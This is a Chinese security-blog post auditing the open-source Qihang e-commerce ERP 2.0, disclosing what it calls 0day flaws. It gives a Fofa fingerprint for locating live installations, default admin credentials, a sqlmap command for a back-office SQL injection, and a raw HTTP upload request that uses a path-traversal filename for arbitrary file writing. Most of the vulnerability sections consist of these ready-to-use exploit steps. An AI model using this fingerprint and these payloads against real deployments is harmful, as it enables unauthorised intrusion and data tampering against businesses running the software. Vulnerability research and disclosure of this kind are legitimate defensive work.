#  【JAVA代码审计】启航电商ERP2.0漏洞挖掘   
原创 星悦  星悦安全   2025-04-21 11:34  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
█   
该文章来自零日防线社区用户投稿   
█  
  
启航电商ERP系统2.0版本是一个完整开箱即用的开源电商ERP系统，经历1.0版本的迭代优化和客户使用验证。开发者可以直接部署即可使用。一个专注核心订单处理业务，主体功能包括：商品库管理（商品、SKU、分类、属性、供应商等）、订单库管理、店铺订单管理、发货管理、售后管理、库存管理、店铺管理（店铺管理、店铺商品管理、店铺电子面单账号管理、平台参数设置）等。  
  
Fofa指纹:  
"static/css/chunk-libs.b880db92.css"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9ULRbiciah30cNcb12vXE06tEZEV2BWJCBbTxmLLQBaOCnWK9Bp5SibtyQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9Jxp1MQJ9f8rMXiaO5z4QMH80jb6fLVPSV1lE4pibpwDZuT7P3y28lRSA/640?wx_fmt=png&from=appmsg "")  
  
后台：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9Hj9WS9ob84Tt7xWFjt9unFHzYt1YKrZq2GiaVXUrdqHkODjyFA10Diaw/640?wx_fmt=png&from=appmsg "")  
  
安装部署:  
  
```
启航电商ERP2.0系统
https://gitee.com/qiliping/qihangerp

mysql8
vue
  npm install
  set NODE_OPTIONS=--openssl-legacy-provider
  npm run dev
redis
  127.0.0.1
  密码注释掉
nginx
  请求localhost:88/dev-api/xxx的请求转发到localhost:8088/xxx
  listen 88;
  location /prod-api/---->location /dev-api/

admin admin123

```  
  
## 0x01 后台SQL注入漏洞  
  
位于 SysDeptController.java 中存在传参，路由为 /api/sys-api/system/dept  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9mcOhtt9IgvKnrtUDNkSqlyLSt1vSfuHsZOwTj5TArMH8Ybg4VoETDg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9LjZzKib85R9Iv6huVRwndX6ibtunEsSicdYmg0MwwyYV1gphj2HELdclw/640?wx_fmt=png&from=appmsg "")  
  
Payload: 访问后台，抓包搜索  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9zcdbBcaluuiaVneic7nwZE6BqtGvVF1tLGvibOu9AicUDY1ibibPeGj768mA/640?wx_fmt=png&from=appmsg "")  
  
```
python sqlmap.py -r 1.txt --batch -p params[dataScope] -t MYSQL --level5 --risk3

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9YnvNsEjLkhyw1qaouMwibTHiakcRNn4Jia12gGcgzYygDUXn0GGBoKeuQ/640?wx_fmt=png&from=appmsg "")  
## 0x02 后台任意文件写入  
  
触发点位于 GoodsController.java 中 这里获取了File参数后上传，且没有做任何校验  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q9dcxqh9NGVcWWTricic2eTvTNDxZENq1IEibfXogDiaNlv7Spkc9w5kppyA/640?wx_fmt=png&from=appmsg "")  
  
Payload:  
  
```
POST /dev-api/api/oms-api/goods/goods_sku_import
Cookie: AdminToken=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImVkYTM0NmE0LTg1ZjctNDUwOC1hYzU5LTZiZDljMzY4ZmNkNCJ9.xEAke3QVZqxKar_ymolByj9JTVz2qVluTueuxiCW_n0tUegjwIW9IXvIQZjRFkkGLLeeXKpIal-ZZ_XhuhjpQ

------WebKitFormBoundaryZbLbp9JQe0WhOgj3
Content-Disposition: form-data; name="file";    filename="\\..\\..\\mitan.txt"
Content-Type: image/png

11111111111
------WebKitFormBoundaryZbLbp9JQe0WhOgj3--

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dzia1fznh7VvQ5cYujEY4Q90b066BFrKnzmEcLYTqkNEzRFcRJYMicdO9tLvgA9LSqkdeHVWSaDYJQ/640?wx_fmt=png&from=appmsg "")  
## 0x03 源码下载  
  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**ERP源码关注公众号发送 250421 获取!**  
  
****  
  
  
优质代码审计社区-零日防线 加入方式:   
  
```
https://mp.weixin.qq.com/s/EFgzGZSc7DGxXZc3DlALtw
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dRh2qJocKRqXsPUaMdtXwOicRKb2g7p9nlbJkJhmssBibAj7DBNY2rjXicoI2Xpmc176zwGzWEIjW9A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
